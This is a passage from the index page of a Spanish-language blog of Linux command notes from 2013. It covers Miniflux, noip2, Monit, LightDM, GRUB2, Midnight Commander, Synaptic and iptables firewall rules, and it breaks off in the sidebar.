
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>TRACTATUS ELEMENTALIS</title>
  <meta name="author" content="templix">

  
  <meta name="description" content="Lector RSS instalado en local o en un servidor. Simplemente se descarga la aplicación de http://miniflux.net/ y, una vez descomprimida, se copia al &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="https://tractatuslapipaplena.herokuapp.com">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="TRACTATUS ELEMENTALIS" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script src="/javascripts/links.js"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div align=center>
  <h1><a href="/">TRACTATUS ELEMENTALIS</a></h1>
  
    <h2>Apuntes sobre bash. Orgasmos con la terminal.</h2>
  </dev>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS"></a></li>
  
</ul>
  
<form action="https://www.google.com/search?q=site%3Atractatuslapipaplena.herokuapp.com&q=" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:tractatuslapipaplena.herokuapp.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/previa">Previa</a></li>
  <li><a href="/">Últimas</a></li>
  <li><a href="/blog/archives">Todas</a></li>
  <li><a href="/scripts">Scripts</a></li>
  <li><a href="http://www.lapipaplena.net">Web</a></li>
  <li><a href="http://lapipaplena.no-ip.org/wiki/">Wiki</a></li>
  <li><a href="http://anonops.es">Foro</a></li>
  <li><a href="http://panellpipa.no-ip.org">Socios</a></li>

</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/miniflux/">Miniflux</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-24T15:34:00+01:00" pubdate data-updated="true">24-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Lector RSS instalado en local o en un servidor. Simplemente se descarga la aplicación de <a href="http://miniflux.net/">http://miniflux.net/</a> y, una vez descomprimida, se copia al directorio web (generalmente /var/www). Se accede colocando en la barra de direcciones: http://localhost/miniflux (Por defecto el nombre de usuario y contraseña son admin:admin)</p>

<p>Atajos de teclado:</p>

<p>gu (Ir a leydas)</p>

<p>gb (Ir a marcadores)</p>

<p>gh (Ir al historial)</p>

<p>gs (Ir a suscripciones)</p>

<p>gp (Ir a preferencias)</p>

<p>s (Descargar contenido)</p>

<p>p (Noticia anterior)</p>

<p>n (Noticia siguiente)</p>

<p>m (Marcar como leido)</p>

<p>v (Abrir la noticia original)</p>

<p>o (Desplegar la noticia)</p>

<p>f (Añadir a favoritos)</p>

<p>h (Ir a página precedente)</p>

<p>l (Ir a página anterior)</p>

<p>? (Abrir la ayuda de los atajos de teclado)</p>

<p>q (Cerrar la ayuda)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/noip2/">Noip2</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-22T17:15:00+01:00" pubdate data-updated="true">22-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Servicio de redireccionamiento de ip dinamica a fija. Requiere registro en www.no-ip.com</p>

<blockquote><p># noip2 -C    (Inicio de la configuración del servicio)</p></blockquote>

<pre><code>Please enter the login/email string for no-ip.com (usuario registro no-ip.com) 

Please enter the password for user ‘usuario@email.com’ (Contraseña no-ip) 

Please enter an update interval:[30] (Intervalo de tiempo para actualización) 

Do you wish to run something at successful update?[N] (y/N)  (intro) 

New configuration file ‘/etc/no-ip2.conf’ created.
</code></pre>

<blockquote><p># ps aux | grep noip (Comprobar si está corriendo el servicio)</p>

<p># noip2 -S (Muestra información sobre el proceso activo)</p>

<p># noip2 -K 1234 (Mata el proceso de noip con el número que le indiquemos)</p>

<p># noip2 -M (permite multiple instancias de noip2)</p>

<p># noip2 -i 192.168.1.2 (Forzar a que noip2 actualice los dominios con la IP suministrada)</p>

<p># noip2 -I eth1 (Forzar que noip2 se conecte a internet con la tarjeta de red especificada)</p></blockquote>

<p>Nota.- En algunas distros, para iniciar el servicio al inicio:</p>

<blockquote><p># nano /etc/rc.local</p></blockquote>

<p>Y colocar, según donde se encuentre el ejecutable, la linea:</p>

<p>/usr/local/bin/noip2 &amp;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/speaker/">Speaker</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-21T21:34:00+01:00" pubdate data-updated="true">21-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>[ver aoss espeak]</p>

<p>Pruebas de sonido.</p>

<blockquote><p># speaker-test -c 6 -t wav (probar altavoces usando voz [t])</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/monit/">Monit</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-21T17:03:00+01:00" pubdate data-updated="true">21-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Monitorizador de procesos en ejecución, servicios, demonios, espacios de disco, PIDs, checksums, archivos&#8230;.</p>

<blockquote><p># monit status (Acceder a los informes)</p>

<p># monit -t (Comprobar errores de configuración [Control file syntax OK])</p>

<p># monit -h (Listado de comandos disponibles)</p>

<p># monit quit (Salir)</p>

<p># monit start all (Arrancar todos los monitoreos)</p>

<p># monit sotp ssh (Parar un monitoreo de un servicio)</p>

<p># monit restart all (Reiniciar todos los monitoreos)</p>

<p># monit summary (Mostrar resumen)</p></blockquote>

<p>Configuración:</p>

<pre><code># nano /etc/monitrc 
</code></pre>

<p>Las entradas globales empiezan por “set” y los servicios concretos por “check”</p>

<p>Tiempo de actualización de datos, por defecto:</p>

<pre><code>set daemon  60 
</code></pre>

<p>Especificar el archivo de eventos (logs)</p>

<pre><code>set logfile /var/log/monit.log 
</code></pre>

<p>Configurar para el envio de notificaciones:</p>

<pre><code>set mailserver localhost 

set alert usuario@localhost.localdomain 

set mail-format { 

from: monit@$HOST 

subject: $SERVICE $EVENT 

message: $ACTION $SERVICE at $DATE on $HOST: $DESCRIPTION. 

} 

set mailserver mail@mail.com (servidor smtp que envia los correos [localhost para notificación local]). 

set alert user@hots.com  (cuenta donde enviar los mensajes de alerta). Ejemplo para enviar notificaciones a correo gmail (en negrita los datos a modificar): 

set mailserver smtp.gmail.com port 587 

username usuario@gmail.com password Tfer7¿-6j 

using tlsv1 

with timeout 30 seconds 

set alert usuario@gmail.com 

Cambiar usuario y contraseña (por defecto: admin/monit) 

allow usuario:contraseña 
</code></pre>

<p>Especificar desde donde accederemos. Sólo acceso local [localhost:2812]:</p>

<p>set httpd port 2812 and use address localhost</p>

<p>allow localhost</p>

<p>o si queremos acceso remoto [http://ip_o_host:2812] modificar por:</p>

<pre><code>set httpd port 2812 

     allow localhost 
</code></pre>

<p>Tambien podemos especificar: ips, rangos, hosts concretos o usuarios para solo lectura:</p>

<pre><code>allow 192.168.1.14 

allow 192.168.1.1/24 

allow host.com 

allow usuario:contraseña read-only
</code></pre>

<p>Modificar el nombre del equipo [tiene que estar en /etc/hosts] y adaptar los porcentajes de consumo de carga del sistema [loadvg] y cpu para que al superar ciertos índices o porcentajes, envie una alerta:</p>

<p>check system tux</p>

<pre><code>if loadavg (1min) &gt; 4 then alert 

if memory usage &gt; 75% then alert 

if swap usage &gt; 85% then alert 

if cpu usage (user) &gt; 70% then alert 

if cpu usage (system) &gt; 70% then alert 

if cpu usage (wait) &gt; 70% then alert 
</code></pre>

<p>Configurar el monitoreo de apache (Las rutas a los ficheros pertenecen a una distro arch):</p>

<p>check process apache with pidfile /run/httpd/httpd.pid</p>

<pre><code>start program = "/etc/rc.d/httpd start" with timeout 60 seconds 

stop program  = "/etc/rc.d/httpd stop" 

if cpu &gt; 80% for 5 cycles then restart 

if totalmem &gt; 1500.0 MB for 5 cycles then restart 

if children &gt; 250 then restart 

if cpu usage &gt; 95% for 3 cycles then restart 

if failed port 80 protocol http then restart 
</code></pre>

<p>Configurar monitoreo de ssh</p>

<p>check process ssh with pidfile /run/sshd.pid</p>

<pre><code>start program = "/etc/rc.d/sshd start" with timeout 60 seconds 

stop program  = "/etc/rc.d/sshd stop" 

if cpu &gt; 80% for 5 cycles then restart 

if totalmem &gt; 1500.0 MB for 5 cycles then restart 

if children &gt; 250 then restart 

if cpu usage &gt; 95% for 3 cycles then restart 

if failed port 22 protocol ssh then restart 
</code></pre>

<p>Chequear determinados puertos:</p>

<p>check host localhost with address localhost</p>

<pre><code>  if failed icmp type echo count 10 with timeout 15 seconds 

     then alert 

  if failed port 22 proto ssh then alert 

  if failed port 25 proto smtp then alert 

  if failed port 80 proto http then alert 
</code></pre>

<p>Monitorear ciertos archivos de configuración [de apache y ssh] para que alerte si modifica el checksum:</p>

<pre><code>check file httpd.conf with path /etc/httpd/conf/httpd.conf 

if changed checksum then alert 

check file ssh_config with path /etc/ssh/ssh_config 

if changed checksum then alert 
</code></pre>

<p>Monitorizar directorios para que envie una alerta en caso de modificación:</p>

<pre><code>        check directory sbin with path /sbin 

    if changed timestamp then alert 
</code></pre>

<p>Monitorizar dispositivos /dev/ [discos duros, usb&#8230;] para que avise en caso de sobrepasar determinado espacio en disco o lo desmonte al llegar a cierto porcentaje:</p>

<pre><code>check device sda5 with path /dev/sda5 

start = “/bin/mount /dev/sda5” 

stop = “/bin/umount /dev/sda5” 

if space usage &gt; 90% then alert 

if space usage &gt; 98% then stop 
</code></pre>

<p>Si, al pasar algún evento queremos lanzar un script algunos ejemplos para hacerlo son:</p>

<p>1.- Cuando la carga del sistema sobrepasa el indice 5 alertará y si supera el 20 ejecutará el script:</p>

<p>check system dominio.com</p>

<pre><code>if loadavg (1min) &gt; 5 then alert 

if loadavg (1min) &gt; 20 then exec "/bin/bash /root/script.sh" 
</code></pre>

<p>2.- Si falla el servidor ftp [puerto 21], al pasar 20 segundos alertará  y ejecutará el script</p>

<p>if failed port 21 protocol ftp with 20 seconds then alert and exec “/ftp/script.sh”</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/lightdm/">Lightdm</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-21T17:03:00+01:00" pubdate data-updated="true">21-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Gestor de sesiones.</p>

<p>1.-</p>

<p>Suprimir la cuenta de invitado:</p>

<blockquote><p># nano /etc/lightdm/lightdm.conf</p></blockquote>

<p>Añadir la linea:</p>

<p>allow-guest=false</p>

<blockquote><p># restart lightdm (Reiniciar servicio)</p></blockquote>

<p>2.-</p>

<p>Entrar de forma automática:</p>

<blockquote><p># nano /etc/lightdm/lightdm.conf</p></blockquote>

<p>autologin-user=USUARIO</p>

<p>autologin-user-timeout=0</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/grub2/">Grub2</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-21T17:03:00+01:00" pubdate data-updated="true">21-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Gestor de arranque. Los dispositivos empiezan por 0 y las particiones empiezan con 1. “sda1” es “hd0,1” y no “hd0,0” como en el antiguo grub.</p>

<p>1.-</p>

<p>Modificación de parámetros generales:</p>

<blockquote><p># gedit /etc/default/grub</p></blockquote>

<pre><code>GRUB_DEFAULT= 0/saved (0 selecciona primera entrada, 1 la segunda... "saved" selecciona la última entrada  ejecutada.) 

GRUB_TIMEOUT=10 (tiempo de espera antes de arrancar) 

GRUB_HIDDEN_TIMEOUT=0  (esconder el menú de entradas. Si hay varios sistemas comentarlo) 

GRUB_HIDDEN_MENU_QUIET=true (oculta la cuenta atrás. "false" la muestra) 

GRUB_DISTRIBUTOR=lsb_release -i -s 2&gt; /dev/null || echo Debian (determina el nombre del sistema) 

GRUB_CMDLINE_LINUX="acpi_osi=Linux" (opciones concretas que pueden pasarse al arranque) 

GRUB_CMDLINE_LINUX_DEFAULT="splash noapic" (otras opciones por defecto) 

GRUB_GFXMODE=1024x768 (activa el grub gráfico) 

GRUB_DISABLE_LINUX_RECOVERY="true" (muestra la opción de recovery mode en el menú. “false lo suprime) 
</code></pre>

<blockquote><p># update-grub2   (hacer efectivos los cambios)</p></blockquote>

<p>2.-</p>

<p>Para que no aparezca memtest en el menú:</p>

<blockquote><p># chmod -x /etc/grub.d/20_memtest86+</p></blockquote>

<p>El mismo comando con “+x” lo restituye.</p>

<blockquote><p># update-grub2</p></blockquote>

<p>3.-</p>

<p>Quitar lineas que hacen referencia a kernels antiguos:</p>

<blockquote><p># dpkg &#8211;get-selections | grep linux-image  (averiguar los instalados)</p>

<p># apt-get remove &#8211;purge linux-image-2.6.xx-xx-generic</p></blockquote>

<p>El update-grub2 se hará de forma automática.</p>

<p>4.-</p>

<p>Cambiar la imagen de fondo [apt-get install grub2-splashimages]. Si se quieren hacer con gimp, estas han de tener un tamaño de  640×480 pixeles y extensión .tga</p>

<blockquote><p>$ ls /usr/share/images/grub   (directorio de la imágenes)</p>

<p># gedit /etc/grub.d/05_debian_theme</p></blockquote>

<p>Y modificamos en la linea:</p>

<p>WALLPAPER=&#8221;/usr/share/images/grub/Lake_mapourika_NZ.tga&#8221;</p>

<blockquote><p># update-grub2</p></blockquote>

<p>5.-</p>

<p>Reinstalar grub2 desde un live-cd o desde otra partición.</p>

<blockquote><p># fdisk -l   (para saber la partición del grub que queremos instalar)</p>

<p># mount /dev/sda2 /media/sda2  (motar la partición)</p>

<p># mount -o bind /dev/ /media/sda2/dev/  (montar los sistemas de ficheros)</p>

<p># mount -o bind /sys/ /media/sda2/sys/</p>

<p># mount -o bind /proc/ /media/sda2/proc/</p>

<p># chroot /media/sda2    (Chorootear la partición que alberga el grub que vamos a instalar)</p>

<p># grub-install /dev/sda   (instalar grub en el disco)</p></blockquote>

<p>6.-</p>

<p>Para solucionar el problema de que al arrancar un sistema operativo la pantalla no muestra nada, editar el archivo:</p>

<blockquote><p># nano /etc/default/grub</p></blockquote>

<p>Y en la linea:</p>

<p>GRUB_CMDLINE_LINUX_DEFAULT=&#8221;quiet&#8221;</p>

<p>Añadir el chipset de vuestra gráfica:</p>

<pre><code>General (para cualquier gráfica): nomodeset 

ATI (driver libre ati o radeon): radeon.modeset=0 

ATI (driver privativo): nomodeset 

nVidia: xforcevesa o nomodeset 

Nvidia con driver libre (nouveau): nouveau.modeset=0 

Intel: i915.modeset=0 
</code></pre>

<p>Quedando la entrada, por ejemplo para una Intel; como sigue:</p>

<pre><code>GRUB_CMDLINE_LINUX_DEFAULT="quiet i915.modeset=0"
</code></pre>

<p>7.-</p>

<p>Modificar los colores de las fuentes para adaptarlas a las imágenes mostradas.</p>

<blockquote><p># gedit /etc/grub.d/05_debian_theme</p></blockquote>

<p>y modificar las líneas</p>

<p>set menu_color_normal=white/black</p>

<p>set menu_color_highlight=black/light-gray</p>

<p>color_normal (los que se utilizan por defecto)</p>

<p>color_highlight (los que se utilizan para la entrada seleccionada).</p>

<p>El primero de los 2 colores de cada uno de estos campos se refiere al color de la fuente, y el segundo, al color de fondo.</p>

<p>Colores permitidos:</p>

<pre><code>red (rojo)

green (verde) 

blue (azul)

yellow (amarillo)

cyan (cian)

magenta (magenta)

white (blanco)

black (negro) 

light-gray (gris claro)
</code></pre>

<p>8.-</p>

<p>Colocar contraseña a grub2 para dos usuarios:</p>

<blockquote><p># nano /etc/grub.d/00_header</p></blockquote>

<p>Colocar al final:</p>

<p>cat &lt;&lt; EOF</p>

<p>set superusers=”usuario1”</p>

<p>password usuario1 la_contraseña</p>

<p>password usuario2 otra_contraseña</p>

<p>EOF</p>

<p>9.-</p>

<p>Para que en el grub2 salga la partición de windows del sistema pero no otras particiones ntfs (de recuperación, HP, ….)</p>

<blockquote><p>$ gedit /boot/grub/grub.cfg</p></blockquote>

<p>Copiar el menuentry perteneciente a la partición windows (no la de recuperación) y pastearla en:</p>

<blockquote><p># gedit /etc/grub.d/40_custom</p></blockquote>

<p>Luego:</p>

<blockquote><p># gedit /etc/default/grub</p></blockquote>

<p>Y añadir al final del archivo la linea:</p>

<p>GRUB_DISABLE_OS_PROBER=true</p>

<p>Recargar grub:</p>

<blockquote><p># update-grub</p></blockquote>

<p>Nota.- Las entradas de 40_custom no se muestran en la salida de la consola pero quedan reflejadas en el grub.cfg</p>

<p>10.-</p>

<p>Poner contraseña a grub2</p>

<blockquote><p># grub-mkpasswd-pbkdf2 (Crear la contraseña encriptada en SHA512)</p>

<p># nano /etc/grub.d/00_header</p></blockquote>

<p>Y colocar al final del archivo:</p>

<p>cat &lt;&lt; EOF</p>

<p>set superusers=&#8221;usuario&#8221;</p>

<p>password_pbkdf2 usuario contraseña_SHA512</p>

<p>EOF</p>

<blockquote><p># nano /etc/grub.d/10_linux</p></blockquote>

<p>Buscar la linea:</p>

<p>printf &#8220;menuentry &#8216;${title}&#8217; ${CLASS} {\n&#8221; &#8220;${os}&#8221; &#8220;${version}&#8221;</p>

<p>Y colocar al usuario al final de {CLASS}:</p>

<p>printf &#8220;menuentry &#8216;${title}&#8217; ${CLASS} &#8211;users usuario {\n&#8221; &#8220;${os}&#8221; &#8220;${version}&#8221;</p>

<blockquote><p># update-grub</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/mc/">Mc</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-20T17:38:00+01:00" pubdate data-updated="true">20-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Gestor de archivos. La pantalla de Midnight Commander está divida en cuatro partes. La mayor parte de la pantalla está ocupada por los dos paneles de directorio. Por defecto, la segunda línea inferior de la pantalla es la línea de órdenes del sistema y la línea inferior muestra las etiquetas de las teclas de función. La línea superior es la barra de menú que si no está visible puede verse pulsando F9. MC pone a la vista dos directorios al mismo tiempo. Uno de los paneles es el panel actual. Algunas operaciones con archivos como Renombrar y Copiar utilizan por defecto el directorio del panel no seleccionado como destino, pero siempre solicitan una confirmación previa y podemos cambiarlo. Podemos ejecutar comandos del sistema desde MC simplemente escribiéndolos. Todo lo que escribamos aparecerá en la línea de órdenes del sistema y cuando pulsemos Intro, Midnight Commander ejecutará estos comandos. Si tenemos el ratón activado [ver gpm] para seleccionar texto mantener pulsada la tecla Mayúsculas mientras se selecciona.</p>

<blockquote><p>$ mc -S gotar.ini /media/servidor /home/usuario (Especificando un skin [Listado en /usr/share/mc/skins] y directorio de cada panel)</p></blockquote>

<p>Colocando la linea como alias en .bashrc arancará siempre con esta configuración inicial:</p>

<blockquote><p>$ nano .bashrc</p></blockquote>

<p>alias mc=&#8217;mc -S gotar.ini /media/servidor /home/usuario&#8217;</p>

<p>Algunas teclas de control:</p>

<pre><code>F1 (Despliega el Menú de ayuda)

F3 (Activa el Visor de archivos interno)

F4 (Ejecuta el Editor interno)

F5 (Copiar archivos)

F6 (Mover archivos)

F7 (Crear carpeta)

F8 (Borrar archivos)

F9 (Activa el menú principal desplegable)

F10 (Salir de mc)

Tab (Moverse entre los paneles)

Insert (Marcar para operaciones con múltiples archivos)

Supr (Eliminar archivo)

Flechas de desplazamiento (Permiten moverse por menús y submenús)

Alt-Enter (copiar el nombre de un archivo en la línea de comandos [cp o mv])

Alt-Tab (misma función que la tecla TAB en el shell [completar comando o ruta tras haber escrito sus primeras letras]

Alt-p (Retrocede por el historico de comandos)

Alt-n (Avanza por el historico de comandos)

Alt-h (Abre una ventana con el historico de comandos)
</code></pre>

<p>1.-</p>

<p>Mas personalizaciones de los colores:</p>

<p>Colores posibles: white, gray, blue, green, yellow, magenta, cyan, red, brown, birghtgreen, brightblue, brightmagenta, brightcyan, brightred, lightgray, default</p>

<p>Se puede incidir en los siguientes aspectos de los grupos:</p>

<pre><code>Base colors: normal, selected, marked, markselect, errors, input, reverse, gauge

Menu colors: menu, menusel, menuhot, menuhotsel

Dialog colors: dnormal, dfocus, dhotnormal, dhotfocus

Help colors: helpnormal, helpitalic, helpbold, helplink, helpslink

Viewer color: viewunderline

Special highlighting colors: executable, directory, link, stalelink, device, special, core

Editor colors: editnormal, editbold, editmarked
</code></pre>

<p>Nota.- No tienen que definirse obligatoriamente todos los subgrupos</p>

<p>Para pruebas:</p>

<pre><code>$ mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default 
</code></pre>

<p>Para dejar la seleccion permanente crear en el directorio (Si no existe se crea):</p>

<blockquote><p>$ nano .moc/ini</p></blockquote>

<p>Y pegar:</p>

<pre><code>[colors]
</code></pre>

<p>normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default</p>

<p>Si lo queremos como alias:</p>

<blockquote><p>$ nano .bashrc</p></blockquote>

<p>Y pegamos:</p>

<pre><code>alias mc="mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default"
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/synaptic/">Synaptic</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-19T21:12:00+01:00" pubdate data-updated="true">19-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Interfaz gráfica para apt, sistema de gestión de paquetes basadas en Debian.</p>

<p>Atajos de teclado:</p>

<p>Ctrl + f (Buscar paquete)</p>

<p>Ctrl + r (Refrescar lista de paquetes)</p>

<p>Ctrl + g (Marcar todas las actualizaciones)</p>

<p>Ctrl + p (Aplicar los cambios)</p>

<p>Ctrl + q (Salir)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/hello/">Hello</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-19T21:07:00+01:00" pubdate data-updated="true">19-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Muestra el clásico &#8220;Hola, mundo&#8221; o un saludo personalizable.</p>

<blockquote><p>$ hello -t (El tradicional &#8220;Hola, mundo&#8221;)</p>

<p>$ hello -n (Un &#8220;Hola, mundo&#8221; de nueva generación)</p>

<p>$ hello -g &#8220;Linux es un sistema genial&#8221; (Muestra la frase)</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/iptables/">Iptables</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-19T18:28:00+01:00" pubdate data-updated="true">19-11-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>herramienta de cortafuegos y trafico de red.</p>

<p>Algunos ejemplos generales:</p>

<pre><code># iptables -F (eliminar todas las reglas)

# iptables -L (si está activo y con qué reglas)

# iptables -L -vn (mostrando los puertos e información detallada)

# iptables -L -t nat (Listar reglas de una tabla concreta)

# iptables -L fail2ban-ssh (comprobar las ips bloqueadas por fail2ban)

# iptables -D fail2ban-ssh 1 (Quitar la primera ip baneada de las ips bloqueadas)

# iptables -nL --line-numbers (muestra el orden de ejecución de las reglas)

# iptables -nL INPUT (Lista todas las reglas de entrada)

# iptables -nL FORWARD (Lista todas las reglas de salida)

# iptables -D INPUT 3 (borrar la regla número 3)

# iptables -A INPUT -j LOG (Guardar logs de todos los bloqueos)
</code></pre>

<p>Bloquear (DROP)</p>

<pre><code># iptables -P INPUT DROP (Bloquear todo lo que entra)

# iptables -A INPUT -s IP -j DROP (una ip)

# iptables -A INPUT -s IP -i eth0 -j DROP (una ip de una red)

# iptables -A INPUT -s IP -p tcp -dport 22 -j DROP (un puerto de una ip) 

# iptables -A INPUT -s 192.168.1.0/24 -j DROP (una red)

# iptables -A INPUT -m mac --mac-source 00:11:22:33:44:55 -j DROP (una mac)

# iptables -A INPUT -p tcp --destination-port 21 -j DROP (puerto 21 de entrada)

# iptables -A INPUT -p tcp -s IP --destination-port 21 -j DROP (el puerto 21 de entrada sólo para una IP)

# iptables -A INPUT -p tcp -i eth0 -m multiport --destination-port 22,80,443 -j ACCEPT (Varios puertos)

# iptables -A INPUT p tcp -s 192.168.1.0/24 --destination-port 21 -j DROP (el  puerto 21 de entrada para todo un rango de IPs)

# iptables -A FORWARD -p tcp --dport 25 -j DROP (la salida del puerto 25)

# iptables -A INPUT -p tcp --dport 22 -j LOG --log-prefix "Puerto 22 bloqueado" iptables -A INPUT -p tcp --dport 22 -j DROP (haciendo aparecer una mensaje informando del bloqueo)
</code></pre>

<p>Permitir (ACCEPT)</p>

<pre><code># iptables -I INPUT 3 -s 192.168.1.0/8 -j ACCEPT (a la red especificada y poner la regla en tercer lugar)

# iptables -D INPUT -s 192.168.1.0/8 -j ACCEPT (Quitar la regla anterior) 

# iptables -A INPUT -i lo -p all -j ACCEPT (todas las entradas a localhost)

# iptables -A OUTPUT -o lo -p all -j ACCEPT (todas las salidas a localhost)

# iptables -A INPUT -p tcp --dport ssh -j ACCEPT (Un servicio concreto)

# iptables -A INPUT -p tcp -i eth0 -m multiport --destination-port 22,80,443 -j ACCEPT (Todas las entradas a varios puertos)

# iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -j ACCEPT  (Permitir trafico ssh saliente para la red especificada)  
</code></pre>

<p>1.-</p>

<p>Salvar unas reglas de iptables y restablecerlas manualmente:</p>

<blockquote><p># iptables-save -c > /etc/iptables.rules</p>

<p># iptables-restore &lt; /etc/iptables.rules</p></blockquote>

<p>2.-</p>

<p>Salvar unas reglas de iptables para que se activen automaticamente tras un reinicio:</p>

<p>Salvar las reglas:</p>

<blockquote><p># iptables-save > /etc/iptables/rules.v4</p></blockquote>

<p>Crear el archivo:</p>

<blockquote><p># nano /etc/network/if-pre-up.d/iptables (Crear archivo)</p></blockquote>

<p>Con el siguiente contenido:</p>

<pre><code>#!/bin/bash

/sbin/iptables-restore &lt; /etc/iptables/rules.v4
</code></pre>

<p>Otorgar permisos:</p>

<blockquote><p># chmod +x /etc/network/if-pre-up.d/iptables</p></blockquote>

<p>3.-</p>

<p>Otra opción para salvar las reglas y que se activen tras un reinicio:</p>

<blockquote><p># /etc/init.d/iptables-persistent save (Guardar las reglas existentes)</p>

<p># /etc/init.d/iptables-persistent flush (Reseteará todas las reglas)</p></blockquote>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/2/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
<h1>Número de entradas</h1>
	<ul>
	<li>1344</li>
	</ul>
</section>
<section>
  <h1>Añadidos/modificados</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/miniflux/">miniflux</a>
      </li>
    
      <li class="post">
        <a href="/blog/noip2/">noip2</a>
      </li>
    
      <li class="post">
        <a href="/blog/speaker/">speaker</a>
      </li>
    
      <li class="post">
        <a href="/blog/monit/">monit</a>
      </li>
    
      <li class="post">
        <a href="/blog/lightdm/">lightdm</a>
      </li>
    
      <li class="post">
        <a href="/blog/grub2/">grub2</a>
      </li>
    
      <li class="post">
        <a href="/blog/mc/">mc</a>
      </li>
    
      <li class="post">
